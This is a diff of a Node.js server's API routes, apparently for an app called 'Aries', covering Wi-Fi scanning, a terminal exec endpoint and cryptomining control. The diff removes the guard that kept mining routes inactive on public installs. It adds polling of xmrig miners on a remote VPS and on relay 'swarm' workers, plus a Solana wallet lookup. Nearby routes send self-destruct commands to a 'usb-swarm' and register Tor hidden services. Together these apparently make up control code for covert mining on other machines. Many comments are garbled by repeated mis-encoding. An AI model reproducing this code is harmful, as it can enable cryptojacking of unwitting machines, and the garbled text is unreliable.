+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/wifi/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/wifi/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/wifi/status') {
       var WiFiScanner = require('./wifi-scanner');
       var cfg = _refs.config.wifi || {};
@@ -5100,7 +5160,7 @@ undefined
       return json(res, 200, ws.getStatus());
     }
 
-    // â•â•â• POST /api/wifi/scan â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wifi/scan Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/wifi/scan') {
       var WiFiScanner = require('./wifi-scanner');
       var cfg = _refs.config.wifi || {};
@@ -5115,7 +5175,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/wifi/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wifi/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/wifi/deploy') {
       var WiFiScanner = require('./wifi-scanner');
       var ws = _refs.wifiScanner;
@@ -5128,7 +5188,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/wifi/trusted â•â•â• (add/remove trusted SSIDs)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wifi/trusted Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (add/remove trusted SSIDs)
     if (method === 'POST' && reqPath === '/api/wifi/trusted') {
       var body = JSON.parse(await readBody(req));
       var cfg = _refs.config.wifi = _refs.config.wifi || { trustedSSIDs: [] };
@@ -5146,7 +5206,7 @@ undefined
       return json(res, 200, { trustedSSIDs: cfg.trustedSSIDs });
     }
 
-    // â•â•â• GET /api/wifi/arp â•â•â• (quick ARP scan, no port check)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/wifi/arp Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (quick ARP scan, no port check)
     if (method === 'GET' && reqPath === '/api/wifi/arp') {
       var WiFiScanner = require('./wifi-scanner');
       var ws = _refs.wifiScanner || new WiFiScanner({ trustedSSIDs: (_refs.config.wifi || {}).trustedSSIDs || [] });
@@ -5156,7 +5216,7 @@ undefined
       return json(res, 200, { ssid, trusted: ws.isTrusted(ssid), devices, count: devices.length });
     }
 
-    // â•â•â• GET /api/system/monitor â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/monitor Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/monitor') {
       var si = refs.systemIntegration;
       var sysInfo = refs.sysModule ? refs.sysModule.get() : {};
@@ -5196,7 +5256,7 @@ undefined
       return json(res, 200, result);
     }
 
-    // â•â•â• POST /api/system/kill â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/kill Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/kill') {
       var body = JSON.parse(await readBody(req));
       if (!body.pid) return json(res, 400, { error: 'Missing pid' });
@@ -5206,7 +5266,7 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/models â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/models Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/models') {
       // List available Ollama models and configured providers
       var models = [];
@@ -5243,7 +5303,7 @@ undefined
       return json(res, 200, { models: models, count: models.length });
     }
 
-    // â•â•â• POST /api/models/pull â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/models/pull Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/models/pull') {
       var body = JSON.parse(await readBody(req));
       if (!body.name) return json(res, 400, { error: 'Missing model name' });
@@ -5262,7 +5322,7 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/terminal/exec â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/terminal/exec Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/terminal/exec') {
       var body = JSON.parse(await readBody(req));
       if (!body.command) return json(res, 400, { error: 'Missing command' });
@@ -5276,10 +5336,12 @@ undefined
       }
     }
 
-    // --- Admin-only mining routes (no-op on public installs) ---
-    if (_refs._minerState) {
+    // --- Admin-only mining routes ---
+    if (reqPath.startsWith('/api/miner') && !_refs._minerState) _refs._minerState = { mining: false, nodes: {}, startTime: null, poolConnected: false };
+    if (!_refs._xmrigCache) _refs._xmrigCache = { data: null, ts: 0 };
+    {
 
-    // â•â•â• GET /api/miner/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/config') {
       var minerCfgPath = path.join(__dirname, '..', 'config.json');
       try {
@@ -5288,7 +5350,7 @@ undefined
       } catch (e) { return json(res, 200, { config: {} }); }
     }
 
-    // â•â•â• POST /api/miner/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/config') {
       var body = JSON.parse(await readBody(req));
       var minerCfgPath = path.join(__dirname, '..', 'config.json');
@@ -5300,22 +5362,54 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/miner/pnl â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/pnl Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/pnl') {
       var pnlPath = path.join(__dirname, '..', 'data', 'miner-pnl.json');
       try {
         var pnlData = JSON.parse(fs.readFileSync(pnlPath, 'utf8'));
         return json(res, 200, pnlData);
-      } catch (e) { return json(res, 200, { totalBtcMined: 0, todayBtcMined: 0, estimatedDailyBtc: 0, dailyLog: [] }); }
+      } catch (e) { return json(res, 200, { totalSolMined: 0, totalBtcMined: 0, todaySolMined: 0, estimatedDailySol: 0, totalUsd: 0, dailyLog: [] }); }
     }
 
-    // â•â•â• GET /api/miner/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/status') {
       var ms = _refs._minerState || { mining: false, nodes: {}, startTime: null };
       var totalHashrate = 0;
       var totalAccepted = 0;
       var totalRejected = 0;
       var activeNodes = 0;
+      // Live poll xmrig API for real hashrate (cached for 3s)
+      {
+        try {
+          var xmrigData;
+          var xCache = _refs._xmrigCache || { data: null, ts: 0 };
+          if (xCache.data && (Date.now() - xCache.ts) < 3000) {
+            xmrigData = xCache.data;
+          } else {
+            xmrigData = await new Promise(function(resolve, reject) {
+              var xReq = require('http').get('http://127.0.0.1:18088/api.json', { timeout: 2000 }, function(xRes) {
+                var d = ''; xRes.on('data', function(c) { d += c; }); xRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
+              });
+              xReq.on('error', reject); xReq.on('timeout', function() { xReq.destroy(); reject(new Error('timeout')); });
+            });
+            _refs._xmrigCache = { data: xmrigData, ts: Date.now() };
+          }
+          var hr = (xmrigData.hashrate && xmrigData.hashrate.total) ? (xmrigData.hashrate.total[0] || 0) : 0;
+          var conn = xmrigData.connection || {};
+          var localNodeId = 'local-' + require('os').hostname();
+          if (!ms.nodes) ms.nodes = {};
+          ms.nodes[localNodeId] = {
+            hostname: require('os').hostname(), cpu: (xmrigData.cpu && xmrigData.cpu.brand) || '',
+            threads: (xmrigData.hashrate && xmrigData.hashrate.threads) ? xmrigData.hashrate.threads.length : 2,
+            hashrate: hr, sharesAccepted: conn.accepted || 0, sharesRejected: conn.rejected || 0,
+            status: 'mining', uptime: xmrigData.uptime || 0, startTime: ms.startTime
+          };
+          ms.poolConnected = conn.failures === 0 && conn.uptime > 0;
+          ms.mining = true; // xmrig is alive
+          if (!ms.startTime) ms.startTime = Date.now() - (xmrigData.uptime || 0) * 1000;
+          if (!_refs._minerState) _refs._minerState = ms;
+        } catch(e) { /* xmrig API unavailable */ }
+      }
       Object.keys(ms.nodes || {}).forEach(function(k) {
         var n = ms.nodes[k];
         totalHashrate += n.hashrate || 0;
@@ -5332,6 +5426,55 @@ undefined
       if (ms.mining && nodesArr.length === 0) {
         nodesArr.push({ id: 'local', hostname: require('os').hostname(), status: 'mining', local: true, hashrate: totalHashrate, threads: ms.threads || 2, accepted: totalAccepted, rejected: totalRejected });
       }
+      // Add known remote miners (Vultr)
+      try {
+        var vultrXmrig = await new Promise(function(resolve, reject) {
+          var _vultrIp = (refs.config && refs.config.relay && refs.config.relay.vmIp) || (refs.config && refs.config.vultrNodes && refs.config.vultrNodes['vultr-dallas-1'] && refs.config.vultrNodes['vultr-dallas-1'].ip) || '127.0.0.1';
+          var vReq = require('http').get({ hostname: _vultrIp, port: 18088, path: '/api.json', timeout: 3000 }, function(vRes) {
+            var d = ''; vRes.on('data', function(c) { d += c; }); vRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+          });
+          vReq.on('error', function() { resolve(null); }); vReq.on('timeout', function() { vReq.destroy(); resolve(null); });
+        });
+        if (vultrXmrig && vultrXmrig.hashrate) {
+          var vHr = (vultrXmrig.hashrate.total ? vultrXmrig.hashrate.total[0] : 0) || 0;
+          var vConn = vultrXmrig.connection || {};
+          nodesArr.push({ id: 'vultr-dallas', hostname: 'Vultr Dallas', hashrate: vHr, sharesAccepted: vConn.accepted || 0, sharesRejected: vConn.rejected || 0, status: 'mining', uptime: vultrXmrig.uptime || 0, remote: true, cpu: (vultrXmrig.cpu && vultrXmrig.cpu.brand) || '', threads: (vultrXmrig.hashrate.threads || []).length });
+          totalHashrate += vHr;
+          totalAccepted += vConn.accepted || 0;
+          totalRejected += vConn.rejected || 0;
+          activeNodes++;
+        }
+      } catch(e) {}
+      // Pull remote swarm worker mining stats from relay
+      try {
+        var relayCfg = refs.config && refs.config.remoteWorkers || {};
+        var relayUrl = relayCfg.relayUrl || (refs.config && refs.config.relay && refs.config.relay.url) || '';
+        var relaySecret = relayCfg.secret || (refs.config && refs.config.relay && refs.config.relay.secret) || '';
+        var remoteStats = await new Promise(function(resolve, reject) {
+          if (!relayUrl) { resolve(null); return; }
+          var rUrl = new (require('url').URL)(relayUrl + '/api/swarm/mining-stats');
+          var rMod = rUrl.protocol === 'https:' ? require('https') : require('http');
+          var rReq = rMod.get({ hostname: rUrl.hostname, port: rUrl.port, path: rUrl.pathname, timeout: 3000, headers: { 'X-Aries-Secret': relaySecret } }, function(rRes) {
+            var d = ''; rRes.on('data', function(c) { d += c; }); rRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+          });
+          rReq.on('error', function() { resolve(null); }); rReq.on('timeout', function() { rReq.destroy(); resolve(null); });
+        });
+        if (remoteStats && remoteStats.workers && remoteStats.workers.length > 0) {
+          for (var rw = 0; rw < remoteStats.workers.length; rw++) {
+            var rWorker = remoteStats.workers[rw];
+            // Skip if already in local nodes
+            var exists = false;
+            for (var en = 0; en < nodesArr.length; en++) { if (nodesArr[en].id === rWorker.id || nodesArr[en].hostname === rWorker.hostname) { exists = true; break; } }
+            if (!exists) {
+              nodesArr.push({ id: rWorker.id, hostname: rWorker.hostname, hashrate: rWorker.hashrate || 0, sharesAccepted: rWorker.accepted || 0, sharesRejected: rWorker.rejected || 0, status: 'mining', uptime: rWorker.uptime || 0, remote: true });
+              totalHashrate += rWorker.hashrate || 0;
+              totalAccepted += rWorker.accepted || 0;
+              totalRejected += rWorker.rejected || 0;
+              activeNodes++;
+            }
+          }
+        }
+      } catch(e) { /* relay unavailable */ }
       return json(res, 200, {
         mining: ms.mining || false,
         totalHashrate: totalHashrate,
@@ -5344,7 +5487,7 @@ undefined
       });
     }
 
-    // â•â•â• POST /api/miner/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/start') {
       var body = JSON.parse(await readBody(req));
       var minerCfgPath2 = path.join(__dirname, '..', 'config.json');
@@ -5473,10 +5616,14 @@ undefined
       } catch (e) {}
 
       wsBroadcast({ type: 'miner', event: 'started', nodes: workerNodes.length });
+      // FEATURE 3: Save mining state
+      ms.pool = poolUrl;
+      ms.wallet = minerCfg.wallet;
+      _saveMinerState();
       return json(res, 200, { status: 'started', pool: poolUrl, nodes: workerNodes });
     }
 
-    // â•â•â• POST /api/miner/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/stop') {
       var ms = _refs._minerState;
       if (!ms || !ms.mining) return json(res, 200, { status: 'not_running' });
@@ -5507,10 +5654,64 @@ undefined
       }
 
       wsBroadcast({ type: 'miner', event: 'stopped' });
+      // FEATURE 3: Save stopped state
+      _saveMinerState();
       return json(res, 200, { status: 'stopped' });
     }
 
-    // â•â•â• POST /api/swarm/destruct â€" trigger self-destruct on workers â•â•â•
+    // â• â•â• GET /api/wallet/balance â•â•â•£ (FEATURE 4)
+    if (method === 'GET' && reqPath === '/api/wallet/balance') {
+      var now = Date.now();
+      if (_walletBalanceCache && (now - _walletBalanceCache.ts) < 60000) {
+        return json(res, 200, _walletBalanceCache.data);
+      }
+      var walletAddr = '';
+      try {
+        var mcfgW = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
+        if (mcfgW.miner && mcfgW.miner.wallet) {
+          var w = mcfgW.miner.wallet;
+          // Strip "SOL:" prefix if present
+          walletAddr = w.replace(/^SOL:/i, '');
+        }
+      } catch {}
+      var balanceResult = { sol: 0, usd: 0, solPrice: 0, wallet: walletAddr, error: null };
+      // Fetch SOL balance via Solana RPC
+      try {
+        var solData = await new Promise(function(resolve, reject) {
+          var postData = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddr] });
+          var solReq = require('https').request({
+            hostname: 'api.mainnet-beta.solana.com', port: 443, path: '/', method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
+            timeout: 10000
+          }, function(solRes) {
+            var d = ''; solRes.on('data', function(c) { d += c; });
+            solRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
+          });
+          solReq.on('error', reject); solReq.on('timeout', function() { solReq.destroy(); reject(new Error('timeout')); });
+          solReq.write(postData); solReq.end();
+        });
+        if (solData && solData.result && solData.result.value != null) {
+          balanceResult.sol = solData.result.value / 1e9; // lamports to SOL
+        }
+      } catch (e) { balanceResult.error = 'RPC error: ' + e.message; }
+      // Fetch SOL/USD price from CoinGecko
+      try {
+        var priceData = await new Promise(function(resolve, reject) {
+          require('https').get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', { timeout: 10000 }, function(pRes) {
+            var d = ''; pRes.on('data', function(c) { d += c; });
+            pRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
+          }).on('error', reject);
+        });
+        if (priceData && priceData.solana && priceData.solana.usd) {
+          balanceResult.solPrice = priceData.solana.usd;
+          balanceResult.usd = balanceResult.sol * balanceResult.solPrice;
+        }
+      } catch (e) { /* price fetch failed, non-critical */ }
+      _walletBalanceCache = { ts: now, data: balanceResult };
+      return json(res, 200, balanceResult);
+    }
+
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/destruct Ã¢â‚¬" trigger self-destruct on workers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/destruct') {
       var body = JSON.parse(await readBody(req));
       var dRelayDir = path.join(__dirname, '..', 'usb-swarm');
@@ -5537,14 +5738,14 @@ undefined
       return json(res, 200, { status: 'destruct_sent', target: body.workerId || 'all' });
     }
 
-    // â•â•â• Tor Hidden Service Routes â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Tor Hidden Service Routes Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     try {
       var torService = require(path.join(__dirname, 'tor-service'));
       var torResult = torService.registerRoutes(method, reqPath, res, json, null, refs);
       if (torResult !== null && torResult !== undefined) return;
     } catch (e) {}
 
-    // â•â•â• POST /api/miner/node-report â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/node-report Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/node-report') {
       var body = JSON.parse(await readBody(req));
       if (!_refs._minerState) _refs._minerState = { mining: false, nodes: {}, startTime: null, poolConnected: false };
@@ -5568,7 +5769,7 @@ undefined
         var pnl = {};
         try { pnl = JSON.parse(fs.readFileSync(pnlPath, 'utf8')); } catch (e) { pnl = { totalBtcMined: 0, todayBtcMined: 0, estimatedDailyBtc: 0, dailyLog: [] }; }
         // Rough estimate: XMR mining with RandomX, converted to BTC
-        // ~1 KH/s RandomX â‰ˆ 0.000001 XMR/day â‰ˆ 0.0000000025 BTC/day (rough)
+        // ~1 KH/s RandomX Ã¢â€°Ë† 0.000001 XMR/day Ã¢â€°Ë† 0.0000000025 BTC/day (rough)
         var totalHr = 0;
         Object.keys(_refs._minerState.nodes).forEach(function(k) { totalHr += _refs._minerState.nodes[k].hashrate || 0; });
         pnl.estimatedDailyBtc = totalHr * 0.0000000025;
@@ -5579,11 +5780,11 @@ undefined
       return json(res, 200, { ok: true });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // MINING PROFITABILITY, POOL SWITCHER, BENCHMARKING
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/miner/profitability â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/profitability Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/profitability') {
       // SOL price cache
       if (!_refs._solPriceCache) _refs._solPriceCache = { price: 0, ts: 0 };
@@ -5593,19 +5794,75 @@ undefined
         try {
           var priceData = await new Promise(function(resolve, reject) {
             var priceUrl = new (require('url').URL)('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
-            require('https').get({ hostname: priceUrl.hostname, path: priceUrl.pathname + priceUrl.search, timeout: 10000, headers: { 'Accept': 'application/json' } }, function(resp) {
+            var preq = require('https').get({ hostname: priceUrl.hostname, path: priceUrl.pathname + priceUrl.search, timeout: 10000, headers: { 'Accept': 'application/json', 'User-Agent': 'Aries/5.0' } }, function(resp) {
+              if (resp.statusCode >= 300 && resp.statusCode < 400 && resp.headers.location) {
+                var rUrl = new (require('url').URL)(resp.headers.location);
+                require('https').get({ hostname: rUrl.hostname, path: rUrl.pathname + rUrl.search, timeout: 10000, headers: { 'Accept': 'application/json', 'User-Agent': 'Aries/5.0' } }, function(r2) {
+                  var d2 = ''; r2.on('data', function(c) { d2 += c; }); r2.on('end', function() { try { resolve(JSON.parse(d2)); } catch(e) { reject(e); } });
+                }).on('error', reject);
+                return;
+              }
               var d = ''; resp.on('data', function(c) { d += c; }); resp.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
-            }).on('error', reject).on('timeout', function() { reject(new Error('timeout')); });
+            });
+            preq.on('error', reject); preq.on('timeout', function() { preq.destroy(); reject(new Error('timeout')); });
           });
           solPrice = (priceData.solana && priceData.solana.usd) || 0;
+          if (!solPrice) throw new Error('no price');
           cache.price = solPrice;
           cache.ts = Date.now();
-        } catch (e) { /* use cached */ }
+        } catch (e) {
+          // Fallback: try Binance
+          try {
+            var binData = await new Promise(function(resolve, reject) {
+              require('https').get({ hostname: 'api.binance.com', path: '/api/v3/ticker/price?symbol=SOLUSDT', timeout: 8000, headers: { 'User-Agent': 'Aries/5.0' } }, function(resp) {
+                var d = ''; resp.on('data', function(c) { d += c; }); resp.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
+              }).on('error', reject);
+            });
+            solPrice = parseFloat(binData.price) || 0;
+            cache.price = solPrice;
+            cache.ts = Date.now();
+          } catch(e2) { /* use cached */ }
+        }
       }
       var ms = _refs._minerState || { mining: false, nodes: {} };
       var totalHashrate = 0;
-      Object.keys(ms.nodes || {}).forEach(function(k) { totalHashrate += ms.nodes[k].hashrate || 0; });
-      // ~1 KH/s â‰ˆ 0.0003 SOL/day for unMineable RandomX
+      // Live poll xmrig for current hashrate
+      if (ms.mining) {
+        try {
+          var xd = await new Promise(function(resolve, reject) {
+            var xr = require('http').get('http://127.0.0.1:18088/api.json', { timeout: 2000 }, function(xRes) {
+              var d = ''; xRes.on('data', function(c) { d += c; }); xRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { reject(e); } });
+            }); xr.on('error', reject); xr.on('timeout', function() { xr.destroy(); reject(new Error('timeout')); });
+          });
+          totalHashrate = (xd.hashrate && xd.hashrate.total) ? (xd.hashrate.total[0] || 0) : 0;
+        } catch(e) {}
+      }
+      if (!totalHashrate) Object.keys(ms.nodes || {}).forEach(function(k) { totalHashrate += ms.nodes[k].hashrate || 0; });
+      // Add Vultr xmrig hashrate directly
+      try {
+        var vxData = await new Promise(function(resolve, reject) {
+          var _vultrIp2 = (refs.config && refs.config.relay && refs.config.relay.vmIp) || (refs.config && refs.config.vultrNodes && refs.config.vultrNodes['vultr-dallas-1'] && refs.config.vultrNodes['vultr-dallas-1'].ip) || '127.0.0.1';
+          var vr = require('http').get({ hostname: _vultrIp2, port: 18088, path: '/api.json', timeout: 3000 }, function(vRes) {
+            var d = ''; vRes.on('data', function(c) { d += c; }); vRes.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+          }); vr.on('error', function() { resolve(null); }); vr.on('timeout', function() { vr.destroy(); resolve(null); });
+        });
+        if (vxData && vxData.hashrate && vxData.hashrate.total) totalHashrate += (vxData.hashrate.total[0] || 0);
+      } catch(e) {}
+      // Add remote swarm worker hashrate from relay
+      try {
+        var prRelayCfg = refs.config && refs.config.remoteWorkers || {};
+        var prRelayUrl = prRelayCfg.relayUrl || (refs.config && refs.config.relay && refs.config.relay.url) || '';
+        var prRelaySecret = prRelayCfg.secret || (refs.config && refs.config.relay && refs.config.relay.secret) || '';
+        var prRemote = await new Promise(function(resolve, reject) {
+          if (!prRelayUrl) { resolve(null); return; }
+          var pUrl = new (require('url').URL)(prRelayUrl + '/api/swarm/mining-stats');
+          require('http').get({ hostname: pUrl.hostname, port: pUrl.port, path: pUrl.pathname, timeout: 3000, headers: { 'X-Aries-Secret': prRelaySecret } }, function(r) {
+            var d = ''; r.on('data', function(c) { d += c; }); r.on('end', function() { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+          }).on('error', function() { resolve(null); });
+        });
+        if (prRemote && prRemote.totalHashrate) totalHashrate += prRemote.totalHashrate;
+      } catch(e) {}
+      // ~1 KH/s Ã¢â€°Ë† 0.0003 SOL/day for unMineable RandomX
       var solPerDay = (totalHashrate / 1000) * 0.0003;
       var usdPerDay = solPerDay * solPrice;
       // Read electricity cost from config for break-even
@@ -5624,7 +5881,7 @@ undefined
       });
     }
 
-    // â•â•â• GET /api/miner/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/history') {
       var pnlHistPath = path.join(__dirname, '..', 'data', 'miner-pnl.json');
       var pnlHist = { dailyLog: [] };
@@ -5632,7 +5889,7 @@ undefined
       return json(res, 200, { dailyLog: pnlHist.dailyLog || [], totalBtcMined: pnlHist.totalBtcMined || 0 });
     }
 
-    // â•â•â• GET /api/miner/pools â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/pools Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/pools') {
       var mcfgPools = {};
